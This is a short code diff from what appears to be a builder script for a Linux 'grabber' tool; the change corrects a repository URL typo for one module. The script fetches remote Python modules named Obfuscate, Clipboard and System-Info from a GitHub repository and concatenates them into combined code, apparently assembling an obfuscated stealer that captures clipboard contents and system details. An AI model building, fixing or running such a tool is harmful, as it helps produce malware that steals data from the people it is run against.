@@ -59,7 +59,7 @@ if 'Obfuscate' in features:
     obfuscate_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Obfuscate.py').text.strip()
     combined_code += obfuscate_code + "\n" if obfuscate_code else ""
 if 'Clipboard' in features:
-    clipboard_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux-/refs/heads/main/Options/Clipboard.py').text.strip()
+    clipboard_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Clipboard.py').text.strip()
     combined_code += clipboard_code + "\n" if clipboard_code else ""
 if 'System-Info' in features:
     system_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/System-Info.py').text.strip()
